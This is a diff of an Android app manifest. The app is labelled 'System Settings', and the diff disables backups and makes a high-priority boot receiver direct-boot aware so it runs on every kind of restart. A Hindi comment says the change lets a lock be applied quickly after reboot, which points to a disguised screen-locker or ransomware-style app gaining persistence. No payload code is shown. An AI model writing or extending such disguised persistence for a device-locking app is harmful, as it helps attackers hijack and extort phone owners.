@@ -13,6 +13,8 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
     <application
+        android:allowBackup="false"
+        android:fullBackupContent="false"
         android:label="System Settings"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
         
@@ -33,9 +35,14 @@
             android:exported="false"
             android:foregroundServiceType="dataSync"/>
 
-        <!-- फोन रीस्टार्ट पकड़ने वाला सेंसर -->
-        <receiver android:name=".BootReceiver" android:exported="true" android:enabled="true">
+        <!-- फोन रीस्टार्ट पकड़ने वाला सेंसर (VIP पास के साथ ताकि जल्दी लॉक लगे) -->
+        <receiver 
+            android:name=".BootReceiver" 
+            android:exported="true" 
+            android:enabled="true"
+            android:directBootAware="true">
             <intent-filter android:priority="999">
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="android.intent.action.REBOOT" />
